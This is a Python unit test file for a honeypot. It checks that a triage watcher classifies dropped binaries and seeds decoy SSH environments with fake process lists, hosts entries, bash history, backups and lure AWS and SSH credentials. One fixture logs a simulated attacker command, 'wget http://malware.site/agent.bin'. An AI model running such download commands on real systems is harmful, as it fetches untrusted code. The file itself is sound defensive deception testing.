"""
Unit tests for Triage Watcher & Dynamic Decoy Mutation based on binary intelligence.
"""

import asyncio
import os
import shutil
import tempfile
import pytest

from core.triage.watcher import DecoyDownloadHandler, map_to_triage_features
from honeypot.ssh_decoy_builder import SSHDecoyBuilder
from interceptor.session_store import SessionStore
from agents.decision import build_hybrid_classifier, classify_http_request


class DummyDecoy:
    def __init__(self, host_dir):
        self.host_dir = host_dir
        self.container_id = "test-decoy-container-123"


class DummyDecoyManager:
    def __init__(self, decoy_dir):
        self.decoy_dir = decoy_dir

    def get_or_spawn_ssh_decoy(self, session_id):
        return DummyDecoy(self.decoy_dir)


@pytest.fixture
def temp_env():
    """Create a temporary directory structure mimicking runtime decoy environment."""
    tmpdir = tempfile.mkdtemp(prefix="as_test_triage_")
    db_path = os.path.join(tmpdir, "sessions.db")
    store = SessionStore(db_path)

    decoy_base = os.path.join(tmpdir, "decoy_ssh", "sess-test-01")
    downloads_dir = os.path.join(decoy_base, "downloads")
    os.makedirs(downloads_dir, exist_ok=True)

    config = {
        "galah_honeypot": {
            "llm": {
                "router_policy": "ollama_only",
                "ollama_url": "http://127.0.0.1:9999",  # unreachable -> uses specialized fallback
                "ollama_timeout": 1,
            }
        }
    }

    yield {
        "tmpdir": tmpdir,
        "store": store,
        "decoy_base": decoy_base,
        "downloads_dir": downloads_dir,
        "config": config,
    }

    shutil.rmtree(tmpdir, ignore_errors=True)


def test_triage_watcher_downloader_mutation(temp_env):
    """Test that a dropped Downloader binary triggers classification and writes Downloader mutations."""
    store = temp_env["store"]
    decoy_base = temp_env["decoy_base"]
    downloads_dir = temp_env["downloads_dir"]
    session_id = store.get_or_create_session("10.0.0.1")
    store.append_command_history(session_id, "wget http://malware.site/agent.bin")

    builder = SSHDecoyBuilder(temp_env["config"], store)
    classifier = build_hybrid_classifier()
    decoy_mgr = DummyDecoyManager(decoy_base)

    handler = DecoyDownloadHandler(store, classifier, builder, decoy_mgr)

    # Create dummy dropper file (UPX packed, high botnet score)
    sample_file = os.path.join(downloads_dir, "agent.bin")
    with open(sample_file, "wb") as f:
        # 100KB binary data with UPX signature
        f.write(b"MZ" + b"\x00" * 1024 + b"UPX!" + b"\x00" * 50000)

    # Process the binary
    handler._process_binary(session_id, sample_file)

    # Verify session store was updated with triage features and binary triage
    ctx = store._get_context(session_id)
    assert "triage_features" in ctx
    assert len(ctx["triage_features"]) == 12
    assert "binary_triage" in ctx
    assert ctx["binary_triage"]["label"] in ["Downloader", "ADVANCED_APT", "Exploit"]

    # Trigger decoy mutation synchronously for inspection
    decision = {
        "label": "Downloader",
        "action": "redirect_to_decoy",
        "triage_enriched": True,
        "binary_triage": {
            "label": "Downloader",
            "confidence": 0.95,
        },
    }
    asyncio.run(
        builder.prepare_decoy_files(
            session_id, decision, decoy_base, "test-cont", decoy_mgr
        )
    )

    # Verify Downloader mutations were baked into the decoy
    txtcmds_dir = os.path.join(decoy_base, "txtcmds", "bin")
    honeyfs_dir = os.path.join(decoy_base, "honeyfs")

    # Check simulated command outputs
    assert os.path.isfile(os.path.join(txtcmds_dir, "whoami"))
    assert os.path.isfile(os.path.join(txtcmds_dir, "ps"))
    with open(os.path.join(txtcmds_dir, "ps")) as f:
        ps_content = f.read()
        assert "nginx" in ps_content or "http.server" in ps_content

    # Check /etc/hosts has fake internal staging mirrors
    with open(os.path.join(honeyfs_dir, "etc", "hosts")) as f:
        hosts_content = f.read()
        assert "internal-update" in hosts_content or "worker-node" in hosts_content

    # Check .bash_history has staged curl/wget breadcrumbs
    with open(os.path.join(honeyfs_dir, "home", "admin", ".bash_history")) as f:
        hist_content = f.read()
        assert "agent.sh" in hist_content or "payload" in hist_content


def test_triage_watcher_destructive_mutation(temp_env):
    """Test that a Destructive binary triggers Destructive mutations (fake database, df full)."""
    store = temp_env["store"]
    decoy_base = temp_env["decoy_base"]
    downloads_dir = temp_env["downloads_dir"]
    session_id = store.get_or_create_session("10.0.0.2")
    builder = SSHDecoyBuilder(temp_env["config"], store)
    decoy_mgr = DummyDecoyManager(decoy_base)

    decision = {
        "label": "Destructive",
        "action": "drop_and_block",
        "triage_enriched": True,
        "binary_triage": {
            "label": "Destructive",
            "confidence": 0.99,
        },
    }
    asyncio.run(
        builder.prepare_decoy_files(
            session_id, decision, decoy_base, "test-cont", decoy_mgr
        )
    )

    txtcmds_dir = os.path.join(decoy_base, "txtcmds", "bin")
    honeyfs_dir = os.path.join(decoy_base, "honeyfs")

    # Verify df shows high disk usage (target for wiper)
    with open(os.path.join(txtcmds_dir, "df")) as f:
        df_content = f.read()
        assert "98%" in df_content or "/var/lib/mysql" in df_content

    # Verify simulated database service in ps
    with open(os.path.join(txtcmds_dir, "ps")) as f:
        ps_content = f.read()
        assert "mysqld" in ps_content

    # Verify fake backup file seeded for destruction lure
    backup_file = os.path.join(honeyfs_dir, "var", "backups", "db_backup_2026.sql")
    assert os.path.isfile(backup_file)


def test_triage_watcher_advanced_apt_mutation(temp_env):
    """Test that an ADVANCED_APT binary seeds fake AWS and SSH lure credentials."""
    store = temp_env["store"]
    decoy_base = temp_env["decoy_base"]
    session_id = store.get_or_create_session("10.0.0.3")
    builder = SSHDecoyBuilder(temp_env["config"], store)
    decoy_mgr = DummyDecoyManager(decoy_base)

    decision = {
        "label": "ADVANCED_APT",
        "action": "redirect_to_decoy",
        "triage_enriched": True,
        "binary_triage": {
            "label": "ADVANCED_APT",
            "confidence": 0.98,
        },
    }
    asyncio.run(
        builder.prepare_decoy_files(
            session_id, decision, decoy_base, "test-cont", decoy_mgr
        )
    )

    honeyfs_admin = os.path.join(decoy_base, "honeyfs", "home", "admin")

    # Verify fake AWS credentials seeded to engage lateral movement
    aws_cred = os.path.join(honeyfs_admin, ".aws", "credentials")
    assert os.path.isfile(aws_cred)
    with open(aws_cred) as f:
        assert "aws_access_key_id" in f.read()

    # Verify fake SSH authorized_keys seeded
    ssh_auth = os.path.join(honeyfs_admin, ".ssh", "authorized_keys")
    assert os.path.isfile(ssh_auth)
